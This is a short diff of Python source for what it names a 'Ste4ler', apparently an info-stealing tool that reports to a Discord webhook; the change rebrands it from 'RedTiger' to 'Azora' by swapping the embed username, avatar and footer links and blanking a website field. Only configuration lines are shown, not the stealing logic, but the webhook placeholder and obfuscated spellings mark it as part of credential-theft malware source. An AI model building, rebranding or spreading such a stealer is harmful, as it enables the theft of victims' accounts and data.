@@ -41,11 +41,11 @@ def Clear():
         pass
 
 w3bh00k_ur1 = "%WEBHOOK_URL%"
-website = "redtiger.shop"
+website = ""
 color_embed = 0xa80505
-username_embed = 'RedTiger Ste4ler'
-avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
-footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
+username_embed = 'Azora Ste4ler'
+avatar_embed = 'https://github.com/sigmachipmunk/Azora-Multitool/blob/main/Img/Azora.png?raw=true'
+footer_text = "Azora Ste4ler | https://github.com/sigmachipmunk/Azora-Multitool"
 footer_embed = {
         "text": footer_text,
         "icon_url": avatar_embed,
